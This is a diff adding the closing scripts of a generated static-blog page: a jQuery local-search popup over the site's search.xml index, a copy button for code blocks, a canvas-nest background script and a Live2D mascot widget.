+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('复制');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"superSample":2,"width":170,"height":380,"position":"right","hOffset":50,"vOffset":-7},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
